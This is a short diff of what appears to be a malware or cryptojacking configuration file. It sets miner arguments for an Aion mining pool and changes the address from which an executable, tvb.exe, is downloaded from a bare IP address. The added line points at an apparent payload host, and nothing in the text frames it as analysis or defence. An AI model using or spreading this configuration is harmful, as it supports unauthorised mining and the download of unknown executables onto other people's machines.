@@ -31,4 +31,4 @@ AION--  --algo aion --fee 0 --intensity 1 --pec --server cluster.aionpool.tech -
   ONAI--ON1--ONAI
 ------------------------------------------------------------------------------------------------------------------------------------
 GX--ON1--GX
-SWGX--http://47.100.41.251/bolg/tvb.exe--SWGX
+SWGX--http://47.100.41.251/bolg/db/tvb.exe--SWGX
